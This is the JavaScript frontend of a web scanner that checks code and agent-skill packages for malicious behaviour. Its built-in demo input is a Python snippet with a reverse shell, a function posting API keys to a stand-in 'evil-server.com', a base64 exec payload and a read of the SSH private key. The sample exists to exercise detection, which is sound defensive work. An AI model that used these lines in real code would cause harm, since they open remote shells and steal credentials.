/**
 * Skills Security Check — Frontend Application
 */

(function () {
    // --- DOM refs ---
    const codeInput = document.getElementById('codeInput');
    const lineNumbers = document.getElementById('lineNumbers');
    const commandInput = document.getElementById('commandInput');
    const btnScan = document.getElementById('btnScan');
    const btnLoadSample = document.getElementById('btnLoadSample');
    const btnClear = document.getElementById('btnClear');
    const btnBrowse = document.getElementById('btnBrowse');
    const btnSamplePip = document.getElementById('btnSamplePip');
    const btnSampleNpm = document.getElementById('btnSampleNpm');
    const fileInput = document.getElementById('fileInput');
    const fileUpload = document.getElementById('fileUpload');
    const enableLLM = document.getElementById('enableLLM');
    const enableSandbox = document.getElementById('enableSandbox');
    const emptyState = document.getElementById('emptyState');
    const resultsContent = document.getElementById('resultsContent');
    const headerStatus = document.getElementById('headerStatus');

    // Tabs
    const tabCode = document.getElementById('tabCode');
    const tabPackage = document.getElementById('tabPackage');
    const tabContentCode = document.getElementById('tabContentCode');
    const tabContentPackage = document.getElementById('tabContentPackage');

    // Result refs
    const scoreRingFill = document.getElementById('scoreRingFill');
    const scoreValue = document.getElementById('scoreValue');
    const riskBadge = document.getElementById('riskBadge');
    const scoreSummary = document.getElementById('scoreSummary');
    const findingsList = document.getElementById('findingsList');
    const findingsCount = document.getElementById('findingsCount');
    const scanMeta = document.getElementById('scanMeta');
    const packageBanner = document.getElementById('packageBanner');
    const pkgName = document.getElementById('pkgName');
    const pkgMeta = document.getElementById('pkgMeta');

    const statCritical = document.getElementById('statCritical');
    const statHigh = document.getElementById('statHigh');
    const statMedium = document.getElementById('statMedium');
    const statLow = document.getElementById('statLow');
    const statInfo = document.getElementById('statInfo');

    // Current mode
    let currentTab = 'code';

    // ---------------------------------------------------------------
    // Sample data
    // ---------------------------------------------------------------
    const SAMPLE_CODE = `import socket
import subprocess
import os
import base64

def reverse_shell():
    """看起来像一个普通的网络工具函数"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    subprocess.Popen(
        ["/bin/sh", "-i"],
        stdin=s.fileno(),
        stdout=s.fileno(),
        stderr=s.fileno()
    )

def steal_secrets():
    """窃取环境变量中的所有 API 密钥"""
    import requests
    secrets = {k: v for k, v in os.environ.items() if "KEY" in k or "TOKEN" in k}
    requests.post("http://evil-server.com/collect", json=secrets)

# 混淆的恶意代码
encoded_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp"
exec(base64.b64decode(encoded_payload).decode())

# 读取 SSH 私钥
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    private_key = f.read()
`;

    // ---------------------------------------------------------------
    // Tab switching
    // ---------------------------------------------------------------
    tabCode.addEventListener('click', () => switchTab('code'));
    tabPackage.addEventListener('click', () => switchTab('package'));

    function switchTab(tab) {
        currentTab = tab;
        tabCode.classList.toggle('active', tab === 'code');
        tabPackage.classList.toggle('active', tab === 'package');
        tabContentCode.classList.toggle('active', tab === 'code');
        tabContentPackage.classList.toggle('active', tab === 'package');
    }

    // ---------------------------------------------------------------
    // Line numbers
    // ---------------------------------------------------------------
    function updateLineNumbers() {
        const lines = codeInput.value.split('\n').length;
        lineNumbers.textContent = Array.from({ length: lines }, (_, i) => i + 1).join('\n');
    }

    codeInput.addEventListener('input', updateLineNumbers);
    codeInput.addEventListener('scroll', () => {
        lineNumbers.scrollTop = codeInput.scrollTop;
    });

    codeInput.addEventListener('keydown', (e) => {
        if (e.key === 'Tab') {
            e.preventDefault();
            const start = codeInput.selectionStart;
            const end = codeInput.selectionEnd;
            codeInput.value = codeInput.value.substring(0, start) + '    ' + codeInput.value.substring(end);
            codeInput.selectionStart = codeInput.selectionEnd = start + 4;
            updateLineNumbers();
        }
    });

    // ---------------------------------------------------------------
    // Buttons
    // ---------------------------------------------------------------
    btnLoadSample.addEventListener('click', () => {
        codeInput.value = SAMPLE_CODE;
        updateLineNumbers();
    });

    btnClear.addEventListener('click', () => {
        codeInput.value = '';
        updateLineNumbers();
        showEmptyState();
    });

    btnBrowse.addEventListener('click', (e) => {
        e.preventDefault();
        fileInput.click();
    });

    btnSamplePip.addEventListener('click', () => {
        commandInput.value = '/plugin install document-skills+@anthropic-agent-skills';
    });
    btnSampleNpm.addEventListener('click', () => {
        commandInput.value = 'huyang218/Skills-check';
    });

    // Enter key in command input triggers scan
    commandInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') performScan();
    });

    fileInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = (ev) => {
            codeInput.value = ev.target.result;
            updateLineNumbers();
        };
        reader.readAsText(file);
    });

    // Drag & drop
    fileUpload.addEventListener('dragover', (e) => {
        e.preventDefault();
        fileUpload.classList.add('drag-over');
    });
    fileUpload.addEventListener('dragleave', () => fileUpload.classList.remove('drag-over'));
    fileUpload.addEventListener('drop', (e) => {
        e.preventDefault();
        fileUpload.classList.remove('drag-over');
        const file = e.dataTransfer.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = (ev) => {
            codeInput.value = ev.target.result;
            updateLineNumbers();
        };
        reader.readAsText(file);
    });

    // ---------------------------------------------------------------
    // Scan
    // ---------------------------------------------------------------
    btnScan.addEventListener('click', performScan);

    async function performScan() {
        if (currentTab === 'code') {
            await scanCode();
        } else {
            await scanPackage();
        }
    }

    async function scanCode() {
        const code = codeInput.value.trim();
        if (!code) return;

        // Auto-detect: if the input looks like a URL or install command, use package scan
        if (_looksLikeCommand(code)) {
            setLoading(true);
            try {
                const resp = await fetch('/api/v1/scan/package', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        command: code,
                        enable_llm: enableLLM.checked,
                        enable_sandbox: enableSandbox.checked,
                    }),
                });
                if (!resp.ok) throw new Error(`HTTP ${resp.status}: ${(await resp.json()).detail || resp.statusText}`);
                renderResults(await resp.json());
            } catch (err) {
                alert('扫描失败: ' + err.message);
            } finally {
                setLoading(false);
            }
            return;
        }

        setLoading(true);
        try {
            const resp = await fetch('/api/v1/scan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    source_code: code,
                    enable_llm: enableLLM.checked,
                    enable_sandbox: enableSandbox.checked,
                }),
            });
            if (!resp.ok) throw new Error(`HTTP ${resp.status}: ${(await resp.json()).detail || resp.statusText}`);
            renderResults(await resp.json());
        } catch (err) {
            alert('扫描失败: ' + err.message);
        } finally {
            setLoading(false);
        }
    }

    function _looksLikeCommand(text) {
        const t = text.trim();
        // Single line only (multi-line is definitely code)
        if (t.includes('\n')) return false;
        return (
            /^https?:\/\/github\.com\//i.test(t) ||
            /^\/?plugin\s+(install|add|marketplace)/i.test(t) ||
            /^(pip3?|python\s+-m\s+pip)\s+install\s+/i.test(t) ||
            /^(npm|yarn|pnpm)\s+(install|add)\s+/i.test(t) ||
            /^git\s+clone\s+/i.test(t) ||
            /^[a-zA-Z0-9_.-]+\/[a-zA-Z0-9_.-]+$/.test(t)
        );
    }

    async function scanPackage() {
        const cmd = commandInput.value.trim();
        if (!cmd) return;
        setLoading(true);
        try {
            const resp = await fetch('/api/v1/scan/package', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    command: cmd,
                    enable_llm: enableLLM.checked,
                    enable_sandbox: enableSandbox.checked,
                }),
            });
            if (!resp.ok) throw new Error(`HTTP ${resp.status}: ${(await resp.json()).detail || resp.statusText}`);
            renderResults(await resp.json());
        } catch (err) {
            alert('包扫描失败: ' + err.message);
        } finally {
            setLoading(false);
        }
    }

    function setLoading(loading) {
        btnScan.disabled = loading;
        btnScan.querySelector('.btn-text').style.display = loading ? 'none' : 'inline-flex';
        btnScan.querySelector('.btn-loading').style.display = loading ? 'inline-flex' : 'none';
        if (loading) {
            headerStatus.innerHTML = '<span class="spinner" style="width:12px;height:12px;border-width:2px;"></span><span>' +
                (currentTab === 'package' ? '正在拉取并分析包...' : '正在分析...') + '</span>';
            headerStatus.style.color = 'var(--accent)';
            headerStatus.style.background = 'rgba(99,102,241,0.1)';
            headerStatus.style.borderColor = 'rgba(99,102,241,0.2)';
        } else {
            headerStatus.innerHTML = '<span class="status-dot"></span><span>系统就绪</span>';
            headerStatus.style.cssText = '';
        }
    }

    // ---------------------------------------------------------------
    // Render results
    // ---------------------------------------------------------------
    function showEmptyState() {
        emptyState.style.display = 'flex';
        resultsContent.style.display = 'none';
    }

    const RISK_COLORS = { safe: 'var(--safe)', low: 'var(--low)', medium: 'var(--medium)', high: 'var(--high)', critical: 'var(--critical)' };
    const RISK_LABELS = { safe: '安全', low: '低风险', medium: '中风险', high: '高风险', critical: '严重风险' };
    const CATEGORY_LABELS = {
        reverse_shell: '反向Shell', data_exfiltration: '数据窃取', file_system_abuse: '文件滥用',
        code_injection: '代码注入', crypto_mining: '加密挖矿', privilege_escalation: '权限提升',
        network_abuse: '网络滥用', obfuscation: '混淆', supply_chain: '供应链', other: '其他',
    };

    function renderResults(data) {
        emptyState.style.display = 'none';
        resultsContent.style.display = 'flex';
        resultsContent.style.flexDirection = 'column';
        resultsContent.style.gap = '16px';

        // Package banner
        if (data.package_info) {
            packageBanner.style.display = 'flex';
            const pi = data.package_info;
            pkgName.textContent = `${pi.name}@${pi.version}`;
            const metaParts = [`来源: ${pi.source.toUpperCase()}`];
            if (pi.files_count) metaParts.push(`${pi.files_count} 个文件`);
            if (pi.total_size) metaParts.push(`${(pi.total_size / 1024).toFixed(1)} KB`);
            if (pi.metadata?.summary) metaParts.push(pi.metadata.summary);
            pkgMeta.textContent = metaParts.join(' · ');
        } else {
            packageBanner.style.display = 'none';
        }

        const riskColor = RISK_COLORS[data.risk_level] || RISK_COLORS.safe;
        const circumference = 2 * Math.PI * 52;
        const offset = circumference - (data.risk_score / 100) * circumference;
        scoreRingFill.style.stroke = riskColor;
        scoreRingFill.style.strokeDashoffset = offset;
        animateNumber(scoreValue, data.risk_score);
        scoreValue.style.color = riskColor;

        riskBadge.textContent = RISK_LABELS[data.risk_level] || data.risk_level;
        riskBadge.className = `risk-badge risk-${data.risk_level}`;
        scoreSummary.textContent = data.summary.replace(/[^\x00-\x7F\u4e00-\u9fff\u3000-\u303f\uff00-\uffef ,.!?:;()\-\/]/g, '').replace(/\*\*/g, '').trim();

        if (data.stats) {
            statCritical.textContent = data.stats.critical_count || 0;
            statHigh.textContent = data.stats.high_count || 0;
            statMedium.textContent = data.stats.medium_count || 0;
            statLow.textContent = data.stats.low_count || 0;
            statInfo.textContent = data.stats.info_count || 0;
        }

        findingsCount.textContent = `${data.findings.length} 个发现`;
        findingsList.innerHTML = '';
        data.findings
            .sort((a, b) => severityWeight(b.severity) - severityWeight(a.severity))
            .forEach((f) => {
                const card = document.createElement('div');
                card.className = 'finding-card';
                card.innerHTML = `
                    <div class="finding-top">
                        <span class="severity-dot severity-${f.severity}"></span>
                        <span class="finding-title">${escHtml(f.title)}</span>
                        <div class="finding-tags">
                            <span class="tag">${CATEGORY_LABELS[f.category] || f.category}</span>
                            <span class="tag">${f.analyzer}</span>
                        </div>
                    </div>
                    <div class="finding-desc">${escHtml(f.description)}</div>
                    ${f.line_number ? `<span class="finding-line">Line ${f.line_number}</span>` : ''}
                    <div class="finding-detail">
                        ${f.code_snippet ? `<pre class="finding-snippet">${escHtml(f.code_snippet)}</pre>` : ''}
                        ${f.recommendation ? `<div class="finding-recommendation">${escHtml(f.recommendation)}</div>` : ''}
                    </div>`;
                card.addEventListener('click', () => card.classList.toggle('expanded'));
                findingsList.appendChild(card);
            });

        scanMeta.innerHTML = `
            <span>Scan ID: ${data.scan_id.substring(0, 12)}...</span>
            <span>分析器: ${data.stats?.analyzers_used?.join(', ') || 'static'}</span>
            <span>代码行数: ${data.stats?.lines_analyzed || '-'}</span>
            <span>时间: ${new Date(data.created_at).toLocaleString('zh-CN')}</span>`;
    }

    function severityWeight(s) {
        return { critical: 5, high: 4, medium: 3, low: 2, info: 1 }[s] || 0;
    }

    function animateNumber(el, target) {
        let current = 0;
        const step = Math.max(target / 60, 0.5);
        function tick() {
            current = Math.min(current + step, target);
            el.textContent = Math.round(current);
            if (current < target) requestAnimationFrame(tick);
        }
        tick();
    }

    function escHtml(str) {
        if (!str) return '';
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    // ---------------------------------------------------------------
    // Check environment on load
    // ---------------------------------------------------------------
    async function checkHealth() {
        try {
            const resp = await fetch('/api/v1/health');
            const data = await resp.json();
            // Docker check
            if (!data.docker_available) {
                enableSandbox.disabled = true;
                enableSandbox.checked = false;
                const label = enableSandbox.closest('.toggle-option');
                if (label) {
                    label.style.opacity = '0.5';
                    label.title = 'Docker 未运行，沙箱分析不可用';
                    const labelText = label.querySelector('.toggle-label');
                    if (labelText) labelText.innerHTML = '&#x1f4e6; 沙箱动态分析 <small style="color:var(--critical)">(Docker 未运行)</small>';
                }
            }
            // LLM check
            if (!data.llm_configured) {
                const label = enableLLM.closest('.toggle-option');
                if (label) {
                    const labelText = label.querySelector('.toggle-label');
                    if (labelText) labelText.innerHTML = '&#x1f916; LLM 深度分析 <small style="color:var(--medium)">(未配置 API Key)</small>';
                }
            }
        } catch (e) { /* ignore */ }
    }
    checkHealth();

    updateLineNumbers();
})();
